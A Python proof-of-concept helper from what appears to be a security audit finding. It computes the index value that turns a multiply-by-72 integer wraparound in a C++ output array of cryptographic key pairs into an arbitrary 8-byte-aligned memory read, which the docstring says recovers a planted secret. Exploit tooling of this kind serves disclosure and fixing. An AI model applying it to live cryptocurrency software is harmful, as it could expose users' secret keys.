#!/usr/bin/env python3
"""Finding 4 -- solve real_output for an arbitrary 8-byte-aligned target offset.

byte_offset = real_output * sizeof(output_entry) (mod 2^64), and
sizeof(output_entry) = sizeof(pair<uint64_t, rct::ctkey>) = 72 = 8*9.
9 is odd, so it is invertible mod 2^64: every 8-byte-aligned offset is reachable,
forwards and backwards (backwards via wraparound). Verified in
poc/micro/f04c_arbitrary.cpp, which recovers a planted secret exactly.
"""
import sys
M = 1 << 64
ELEM = 72
inv9 = pow(9, -1, M)          # 9 * inv9 == 1 (mod 2^64)

def solve(delta_bytes: int) -> int:
    if delta_bytes % 8:
        raise ValueError("offset must be 8-byte aligned (element size is 8*9)")
    return ((delta_bytes // 8) * inv9) % M

if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(f"usage: {sys.argv[0]} <signed byte offset from outputs.data()>")
    d = int(sys.argv[1], 0)
    k = solve(d)
    back = ((k * ELEM + (1 << 63)) % M) - (1 << 63)     # signed round-trip
    print(f"inv(9) mod 2^64 = 0x{inv9:016x}")
    print(f"real_output     = {k}  (0x{k:016x})")
    print(f"check: {k} * {ELEM} mod 2^64 = {back} bytes {'OK' if back == d else 'MISMATCH'}")
